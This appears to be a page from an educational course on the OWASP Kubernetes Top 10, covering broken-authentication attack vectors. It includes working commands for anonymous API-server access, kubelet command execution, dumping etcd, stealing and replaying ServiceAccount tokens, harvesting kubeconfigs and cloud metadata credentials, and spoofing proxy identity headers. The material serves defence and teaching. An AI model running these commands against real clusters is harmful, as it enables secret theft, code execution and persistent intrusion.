# K06: Broken Authentication Mechanisms - Attack Vectors

## Table of Contents
- [Understanding Authentication Attack Vectors](#understanding-authentication-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Authentication Weaknesses](#chaining-authentication-weaknesses)

## Understanding Authentication Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.

Broken authentication is rarely exploited through a clever payload. It is exploited through **reachability plus a missing check**: an attacker finds a control-plane component that answers requests, then discovers that it either requires no credential or accepts a credential the attacker can obtain, steal, or forge. Because the flaws live in configuration and credential hygiene rather than application logic, they are cheap to find at scale—internet scanners fingerprint API-server, kubelet, and etcd ports continuously.

The attacker's goal in this category is usually one of:

- Reach a control surface (API server, kubelet, etcd, dashboard) that accepts requests without valid authentication.
- Obtain or replay a legitimate credential—a ServiceAccount token, client certificate, or kubeconfig—lifted from a Pod, a log, or a repository.
- Assert an identity the system will trust, such as a spoofed proxy header or an over-trusting OIDC claim, and act as a privileged principal.

### Core Attack Flow

```
1. Discover
   |
   Find reachable control-plane ports: 6443 (API), 10250 (kubelet),
   2379 (etcd), and exposed dashboards / add-on UIs
2. Test authentication
   |
   Send an unauthenticated request; see whether anonymous is accepted
   or a stealable credential is required
3. Obtain a credential (if needed)
   |
   Read a mounted SA token, harvest a kubeconfig/cert from a repo,
   pod filesystem, CI log, or cloud metadata
4. Authenticate / replay
   |
   Present the identity to the API or kubelet; enumerate what it can do
5. Escalate / Exfiltrate
   |
   Read Secrets, exec into pods, schedule workloads, reach etcd,
   establish durable access via a long-lived credential
```

## Common Attack Patterns

### 1. Anonymous Requests to the API Server

With anonymous auth enabled, requests that carry no credential are accepted as `system:anonymous` in the `system:unauthenticated` group and evaluated by RBAC.

```
# Does the API accept anonymous callers at all?
$ curl -sk https://API_SERVER:6443/version
$ curl -sk https://API_SERVER:6443/apis        # discovery is often readable

# The prize: any binding to system:unauthenticated turns this into data:
$ curl -sk https://API_SERVER:6443/api/v1/namespaces/kube-system/secrets
```

**Payoff**: reconnaissance for free, and—if any `ClusterRoleBinding` grants `system:anonymous` or `system:unauthenticated` anything—direct unauthenticated access to whatever that binding allows.

### 2. Unauthenticated Kubelet API (Port 10250)

The kubelet exposes its own HTTPS API. Left with anonymous auth on and authz set to `AlwaysAllow`, it serves Pod listing, logs, and command execution with no RBAC involved.

```
# List pods the node is running:
$ curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'

# Read logs from a container:
$ curl -sk "https://NODE:10250/containerLogs/<ns>/<pod>/<container>"

# Execute a command inside a running container:
$ curl -sk "https://NODE:10250/run/<ns>/<pod>/<container>" -d "cmd=id"
```

**Payoff**: command execution inside workloads and access to their logs and mounted secrets—without ever touching the API server or RBAC.

### 3. Exposed etcd

etcd holds the whole cluster state. Reachable without mutual-TLS client authentication, it is an open door to every object—including Secrets.

```
# Dump every key (Secrets are base64, not encrypted, unless
# encryption-at-rest is configured):
$ etcdctl --endpoints=https://ETCD:2379 get / --prefix --keys-only

# Read a specific Secret straight from the datastore:
$ etcdctl --endpoints=https://ETCD:2379 get /registry/secrets/kube-system/<name>
```

**Payoff**: total disclosure on read; total control on write (inject objects, tamper with RBAC, plant tokens). etcd is the cluster's source of truth.

### 4. Stealing a Mounted ServiceAccount Token

By default many Pods mount a ServiceAccount token. An attacker who executes in a container reads it and reuses it against the API.

```
# Inside a compromised pod:
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ APISERVER=https://kubernetes.default.svc

# Replay the identity against the API:
$ curl -sk -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/secrets
```

**Payoff**: the attacker now holds a valid cluster identity. If the token is a legacy non-expiring one, it can be exfiltrated and replayed from anywhere, indefinitely. Bound projected tokens narrow this to a short window and a single audience.

### 5. Harvesting kubeconfigs and Client Certificates

Long-lived credentials leak into places attackers already look.

```
# Common leak locations:
$ cat ~/.kube/config                       # embedded client cert/key
$ git log -p | grep -i "client-certificate-data\|token:"   # committed creds
$ env | grep -i "KUBECONFIG\|_TOKEN"        # CI environment
$ curl -s http://169.254.169.254/...        # cloud metadata / instance creds
```

**Payoff**: a kubeconfig with an embedded `O=system:masters` client certificate is cluster-admin. Because Kubernetes has no certificate revocation, a leaked long-lived cert is valid until it expires—an unrevocable backdoor.

### 6. Static Token and Basic-Auth Files

Legacy API-server flags loaded credentials from flat files. Where they persist, the secrets are static bearer credentials.

```
# Legacy API server startup (deprecated / removed in modern versions):
kube-apiserver --token-auth-file=/etc/kubernetes/tokens.csv
kube-apiserver --basic-auth-file=/etc/kubernetes/basic-auth.csv

# tokens.csv:  token,user,uid,"group1,group2"
# One leaked line is a permanent credential with those groups.
```

**Payoff**: a single static string authenticates as the named user and groups forever—no expiry, no rotation, no MFA.

### 7. Exposed Kubernetes Dashboard / Admin UIs

A management UI reachable without authentication, or backed by a privileged ServiceAccount, is UI-driven cluster control.

```
# Dashboard reachable and not requiring a login token, or bound to a
# highly-privileged ServiceAccount:
$ curl -sk https://DASHBOARD_HOST/   # renders without credentials
# -> create/exec/read Secrets through the web UI
```

**Payoff**: schedule workloads (commonly cryptomining), read Secrets, and exec into Pods—all through a browser, no credential presented.

### 8. Identity Spoofing via a Trusting Authenticating Proxy

If the API server trusts identity headers from a front proxy but the proxy is reachable directly or misconfigured, an attacker sets the headers themselves.

```
# API server configured to trust proxy-set identity headers:
#   --requestheader-username-headers=X-Remote-User
#   --requestheader-group-headers=X-Remote-Group
# If the attacker can reach the API behind (or as) the proxy:
$ curl -sk https://API_SERVER:6443/... \
    -H "X-Remote-User: admin" -H "X-Remote-Group: system:masters"
```

**Payoff**: the attacker asserts an arbitrary privileged username/group. The safeguard—requiring a trusted client cert from the proxy and never exposing the backend directly—is exactly what breaks here.

### 9. Weak Cloud-IAM-to-RBAC Mapping

Managed clusters map cloud identities to Kubernetes identities. An over-broad mapping turns a modest cloud foothold into cluster-admin.

```
# Conceptual: a cloud role that anyone in the account can assume is
# mapped to a powerful cluster group.
#   cloud role  "developers"  -> k8s group  "system:masters"
# Any developer credential (or a leaked one) is now cluster-admin.
```

**Payoff**: authentication to the cluster inherits every weakness of the cloud identity layer, and a broad mapping erases least privilege at the boundary.

### 10. Replaying Long-Lived Credentials for Persistence

Once any durable credential is obtained, the attacker keeps it as a backdoor.

```
# A non-expiring token or long-lived cert is stashed and reused later,
# surviving password resets and pod restarts:
$ kubectl --token="$STOLEN_TOKEN" get secrets -A
$ kubectl --client-certificate=stolen.crt --client-key=stolen.key get nodes
```

**Payoff**: durable access that outlives incident response, because there is no expiry to wait out and (for certs) no revocation to trigger.

## Chaining Authentication Weaknesses

Individually modest issues combine into full compromise:

```
Anonymous API discovery reveals cluster layout   -> find node IPs
        +
Unauthenticated kubelet on 10250 (exec)           -> run commands in a pod
        +
Pod mounts a legacy non-expiring SA token         -> steal and replay it
        =  authenticated cluster identity + node-level RCE, no exploit
```

Another common chain:

```
kubeconfig with system:masters cert committed to git  -> cluster-admin
        -> read every Secret (cloud keys, DB creds)
        -> because certs can't be revoked, the access persists
        -> pivot into the cloud account with the harvested keys
```

## Key Takeaways

1. **Reachability plus a missing check is the whole attack**—an unauthenticated API, kubelet, or etcd needs no exploit.
2. **The kubelet and etcd are separate doors**—attackers target 10250 and 2379 directly, bypassing API-server RBAC entirely.
3. **Mounted tokens are theft targets**—any code execution in a Pod is a chance to lift and replay a ServiceAccount identity.
4. **Leaked long-lived credentials are permanent**—certs can't be revoked and legacy tokens never expire, so one leak is durable access.
5. **Small weaknesses chain**—anonymous discovery plus an open kubelet plus a mounted token equals cluster compromise with no application bug.

## Next Steps

- **[Prevention Guide](prevention.md)**: Close each of these doors with authentication and short-lived credentials
- **[Code Examples](examples.md)**: See insecure vs. secure configuration for each component
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
